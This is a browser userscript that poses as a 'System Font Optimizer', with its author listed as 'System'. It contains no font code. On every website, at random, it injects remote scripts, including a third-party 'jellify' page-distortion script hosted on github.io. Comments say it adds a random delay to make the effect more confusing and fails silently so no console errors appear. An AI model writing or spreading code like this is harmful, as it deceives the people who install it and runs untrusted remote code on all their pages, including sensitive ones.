// ==UserScript==
// @name         System Font Optimizer
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  Optimizes system fonts for faster page rendering.
// @author       "System"
// @match        *://*/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    // CONFIGURATION:
    // 0.1 = 10% chance
    // 0.01 = 1% chance
    // 0.5 = 50% chance
    const PROBABILITY = 0.1; 

    // Roll the dice
    if (Math.random() > PROBABILITY) {
        return; // Exit and do nothing
    }

    const libs = [
        "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js",
        "https://cdn.jsdelivr.net/npm/matter-js@0.17.1/build/matter.min.js",
        "https://jmcrafter26.github.io/jellify-ur-website/js/jellify.js"
    ];

    function loadScript(url) {
        return new Promise((resolve, reject) => {
            const script = document.createElement("script");
            script.src = url;
            script.type = "text/javascript";
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    async function initJelly() {
        try {
            // Optional: Add a random delay so it doesn't happen 
            // the instant the page loads (makes it more confusing)
            const delay = Math.random() * 5000; // up to 5 seconds
            await new Promise(r => setTimeout(r, delay));

            for (const lib of libs) {
                await loadScript(lib);
            }
        } catch (e) {
            /* Fail silently so no errors appear in console */
        }
    }

    initJelly();

})();
